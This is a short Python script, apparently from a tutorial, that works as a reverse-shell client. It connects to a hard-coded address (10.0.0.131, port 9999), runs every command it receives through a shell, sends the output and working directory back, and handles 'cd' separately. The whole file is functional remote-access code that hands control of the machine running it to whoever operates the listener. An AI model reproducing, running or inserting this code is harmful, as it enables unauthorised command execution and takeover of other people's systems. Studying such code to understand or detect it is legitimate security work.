import socket
import os
import subprocess

s = socket.socket()
host = '10.0.0.131'
# host = '127.0.0.1'  # local host
port = 9999

s.connect((host, port))  # add comment ...

while True:
    data = s.recv(1024)  # add comment ...
    if data[:2].decode('utf-8') == 'cd':
        os.chdir(data[3:].decode('utf-8'))

    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                               stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, 'utf-8')
        currentWD = os.getcwd() + '>'
        s.send(str.encode(output_str + currentWD))  # add comment ...
        print(output_str)
